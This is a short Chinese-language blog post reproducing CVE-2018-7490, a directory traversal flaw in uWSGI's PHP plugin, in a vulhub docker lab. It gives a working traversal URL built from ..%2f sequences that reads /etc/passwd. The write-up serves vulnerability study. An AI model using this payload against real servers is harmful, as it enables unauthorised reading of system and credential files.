---
layout: post
title: uWSGI PHP目录穿越漏洞
tags: uWSGI
categories: CVE-2018-7490
---

# uWSGI PHP目录穿越漏洞（CVE-2018-7490）

## 漏洞描述

uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言。uWSGI 2.0.17之前的PHP插件，没有正确的处理DOCUMENT_ROOT检测，导致用户可以通过..%2f来跨越目录，读取或运行DOCUMENT_ROOT目录以外的文件。

## 漏洞复现

首先使用GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署。
环境启动后，访问`http://your-ip:8080`，可以看到phpinfo页面

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/uWSGI/CVE-2018-7490/15931724751741.jpg)

使用..%2f可以跨目录读取任意文件，如访问`http://your-ip:8080/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd`，读取成功

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/uWSGI/CVE-2018-7490/15931725719068.jpg)

## 受影响的版本

uWSGI 2.0.17之前